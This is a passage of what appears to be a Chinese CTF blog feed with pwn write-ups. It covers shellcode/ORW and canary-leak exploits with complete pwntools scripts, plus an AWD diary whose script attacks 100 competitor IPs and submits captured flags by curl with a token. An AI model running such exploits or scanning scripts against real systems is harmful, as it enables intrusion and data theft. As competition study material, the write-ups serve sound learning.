class="headerlink" title="3.完整EXP："></a>3.完整EXP：</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28443)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp =<span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先构造好shellcode,典型的ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shellcode写在mmap开辟的固定地址，然后call该地址，执行shellcode</span></span><br><span class="line"><span class="comment">#bug() </span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess--canary报错利用</title>
      <link href="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/"/>
      <url>/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="修改argv-0-使canary报错时泄露信息"><a href="#修改argv-0-使canary报错时泄露信息" class="headerlink" title="修改argv[0],使canary报错时泄露信息"></a>修改argv[0],使canary报错时泄露信息</h1><p><a class="link" href="https://buuoj.cn/challenges#wdb2018_guess">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.csdn.net/Invin_cible/article/details/123042863">参考文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font color="red">知识点：</font></p><p>1.<strong>canary报错的利用，熟悉报错的参数是什么</strong></p><p>2.<strong>__environ环境变量</strong></p><h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3LL</span>;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  sub_4009A6(a1, a2, a3);</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400A11() ) <span class="comment">// 此处创建子进程</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(s2); <span class="comment">// 明显的栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><p>是可以发现有三次fork创建子进程的，说明我们可以利用三次canary报错</p></li><li><p>为什么想到这个，是因为我们没有其他的输出的可以利用，所以想到这个。</p></li><li><p>大致的思路就是通过泄露flag在栈上的地址，然后通过canary报错输出出来，具体看下面的实现.</p></li></ul><h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><p>首先要patchelf，将环境改为glibc2.24，不然无法实现。</p><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141131322.bmp"></p><p>发现报错部分出现了程序的名字，那么这个是什么呢？这个其实就是argv[0]，也就是说argv[0]会随着canary报错的时候输出出来，那如果我们将其改为某个函数的got表的内容，那是不是就可以输出其真实地址了，达到泄露libc的作用，下面来看看栈布局：</p><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141833635.bmp"></p><ul><li>这里可以很清楚的看到输入的地址和argv[0]相差0x128,我们通过栈溢出覆盖此处的地址为got表地址即可泄露libc</li></ul><h3 id="1-泄露Libc："><a href="#1-泄露Libc：" class="headerlink" title="(1) 泄露Libc："></a>(1) 泄露Libc：</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></div><ul><li>看看实际效果</li></ul><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916143126078.bmp"></p><h3 id="2-通过-environ泄露环境变量地址"><a href="#2-通过-environ泄露环境变量地址" class="headerlink" title="(2)通过__environ泄露环境变量地址"></a>(2)通过__environ泄露环境变量地址</h3><p>关于__environ可以参考开头的文章</p><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144643853.bmp"></p><ul><li>光标处就是__environ的地址，很明显该地址是在栈上的，因此我们泄露出该地址，就可以获得栈地址了.</li></ul><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144655337.bmp"></p><ul><li>发现flag的地址与__environ的地址差距0x168，因此将environ的地址泄露出来,再减去0x168就是flag的地址，然后通过同样的溢出，就可以泄露flag了.(该flag是我本地建立的，为了调试方便)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure></div><h3 id="3-泄露flag"><a href="#3-泄露flag" class="headerlink" title="(3),泄露flag"></a>(3),泄露flag</h3><p>直接看最后的EXP吧</p><p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p><h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三次创建fork，相当于可以利用三次程序</span></span><br><span class="line"><span class="comment"># 第一次泄漏libc，第二次泄漏栈地址，第三次泄漏flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># 环境变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- 打印出flag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次awd测试</title>
      <link href="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="只针对pwn方向"><a href="#只针对pwn方向" class="headerlink" title="只针对pwn方向"></a>只针对pwn方向</h1><p><font size="4" color="red">题目：<strong>Bugku S3 AWD排位赛-13(双倍积分)</strong></font></p><p><font size="4" color="red">参考视频：<a class="link" href="https://www.bilibili.com/video/BV1FD4y147vu/?spm_id_from=333.337.search-card.all.click&vd_source=3a102c224ddc9fd26cd9c49207334603">AWD_哔哩哔哩_bilibili <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></font></p><p><font size="4" color="red">工具：</font></p><p><strong>Xterminal</strong>：<a class="link" href="https://www.xterminal.cn/">Xterminal - 更好用的开发工具，但不止于(SSH&#x2F;控制台&#x2F;More) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h3 id="1-ssh连接"><a href="#1-ssh连接" class="headerlink" title="1.ssh连接"></a>1.ssh连接</h3><ul><li>此处是结束之后写的，所以缺少截图了，不过可以看上面的参考视频。</li><li>开始比赛之前务必让队长给你本机ip加入到白名单上面</li><li>比赛开始，会有自己的虚拟ip地址，也会给队伍名和密码，队伍名类似于team1，密码较长。</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904222732662.bmp"></p><ul><li>类似上面的，我拿的是Xterminal连接，分组和名称乱填就行。</li></ul><h3 id="2-对pwn文件进行修复和攻击"><a href="#2-对pwn文件进行修复和攻击" class="headerlink" title="2.对pwn文件进行修复和攻击"></a>2.对pwn文件进行修复和攻击</h3><h4 id="2-1-攻击本地"><a href="#2-1-攻击本地" class="headerlink" title="2.1 攻击本地"></a>2.1 攻击本地</h4><ul><li>连接服务器之后，在&#x2F;home&#x2F;ctf文件下面有pwn文件，下载下来即可，拖进自己的虚拟机，然后跟正常的ctf比赛一样。</li><li>checksec一下文件，发现没canary也没有PIE</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223824348.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223741981.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223748645.bmp"></p><ul><li><strong>从ida可以看出，直接给的pwn文件可以说没有任何保护，把能给的信息都给了，还给了栈上地址任意修改的权限，并且还给了后门函数。那么很简单，直接修改ret_addr为后门函数地址就可以得到flag了</strong>。</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904224136529.bmp"></p><h4 id="2-2-攻击远程"><a href="#2-2-攻击远程" class="headerlink" title="2.2 攻击远程"></a>2.2 攻击远程</h4><ul><li>远程其实跟做题目一样，得到ip地址，这一步靠web手将其他服务器的虚拟ip爆破出来(虚拟ip只有一位不同)，然后ping一下就有ip了</li><li><strong>端口问题</strong>：起初我以为是默认的2222，结果上网搜<a class="link" href="https://www.anquanke.com/post/id/256463">其他比赛的脚 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><a class="link" href="https://www.anquanke.com/post/id/256463">本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，发现端口其实是9999</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240902204946705.bmp"></p><ul><li><p><strong>得到的flag就可以直接提交了</strong></p></li><li><p>至于循环提交flag，这里贴一个脚本，但是最后也没来得及测试。脚本中爆破就爆破了一位，但其实后为ip地址都是不相同的</p></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># 本机ip: 47.104.214.84</span></span><br><span class="line"><span class="comment"># 其他ip: 47.104.195.88</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;47.104.195.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        p = remote(ip,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot;saved rbp\n&quot;</span>)</span><br><span class="line">        ret_addr = <span class="built_in">int</span>(p.recv()[<span class="number">1</span>:<span class="number">19</span>],<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">&quot;ret_addr&quot;</span>,<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">        p.send(<span class="built_in">str</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot; = &quot;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(<span class="number">0x00000000004011fa</span>))</span><br><span class="line">        flag = <span class="built_in">str</span>(p.recvuntil(<span class="string">b&#x27;\n\n&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        payload = <span class="string">&quot;curl https://ctf.bugku.com/pvp/submit.html?token=72b8175c72f2abe98330367a34bfa64a&amp;flag=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag)</span><br><span class="line">        os.system(payload)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;本轮共拿到&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;个队伍flag&quot;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="2-3-修复文件"><a href="#2-3-修复文件" class="headerlink" title="2.3 修复文件"></a>2.3 修复文件</h4><ul><li>因为是新手不会在ida patch改，所以上的是通防：<a class="link" href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><font size="4" color="red">具体使用：</font></li></ul><p>1.安装seccomp-tools</p><p>2.git clone + 上面仓库地址.git，然后给pwn文件丢到目录下面</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 evilPatcher.py pwn sandboxs/mini_sandbox.asm</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225530541.bmp"></p><p><font size="4"><strong>pwn.patch就是改了之后的文件</strong>，修改pwn.patch为pwn就行了</font></p><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225753998.bmp"></p><ul><li>可以发现，execve系统调用被禁用了，所以原来的脚本是打不通的。</li></ul><h4 id="2-4-远程上传"><a href="#2-4-远程上传" class="headerlink" title="2.4 远程上传"></a>2.4 远程上传</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P <span class="number">2222</span> filename_addr username@ip:/目录</span><br></pre></td></tr></table></figure></div><ul><li><p>filename_addr就是你要上传的文件绝对地址</p></li><li><p>username就是服务器地址，比如team1，ip就是ping一下你的虚拟ip然后的地址，后面目录就是你要上传到服务器的目录</p></li><li><p>做完这些是要输密码的，正常输入即可</p></li><li><p>一般我们的文件时上传到&#x2F;tmp目录下面，然后根据重定向写入到pwn文件中</p></li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/pwn &gt; <span class="regexp">/home/</span>ctf/pwn</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904230324533.bmp"></p><ul><li>做完这些pwn手可以歇息了(对于我来说也可以歇息了，因为已经不会了)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof-unlink</title>
      <link href="/2024/09/03/hitcon2014-stkof-unlink/"/>
      <url>/2024/09/03/hitcon2014-stkof-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="unlink–只有add-free-edit"><a href="#unlink–只有add-free-edit" class="headerlink" title="unlink–只有add,free,edit"></a>unlink–只有add,free,edit</h1><p><a class="link" href="https://buuoj.cn/challenges#hitcon2014_stkof">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>unlink修改free_got，利用puts_got,puts_plt</strong></p><p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">文章链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="题目速览"><a href="#题目速览" class="headerlink" title="题目速览"></a>题目速览</h2><h4 id="经典堆菜单"><a href="#经典堆菜单" class="headerlink" title="经典堆菜单"></a>经典堆菜单</h4><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211652894.bmp"></p><h4 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h4><ul><li>注意先加一，才记录地址</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211718246.bmp"></p><h4 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h4><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211711681.bmp"></p><h4 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h4><ul><li><font size="4" color="red"><strong>漏洞点，未对size检查</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcon2014-stkof-unlink/capture_20240903211705331.bmp"></p><h2 id="思路分析"><a href="#思路分析" class="headerlink" 